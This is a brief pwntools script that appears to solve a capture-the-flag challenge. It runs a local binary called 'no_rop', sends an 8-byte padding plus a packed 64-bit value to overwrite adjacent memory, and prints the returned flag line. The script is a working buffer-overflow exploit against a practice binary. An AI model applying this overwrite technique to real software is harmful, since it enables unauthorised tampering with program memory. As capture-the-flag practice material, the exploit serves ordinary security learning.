from pwn import *

context.binary = "./no_rop"

p = process()
p.sendline(b"A" * 8 + p64(1))
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
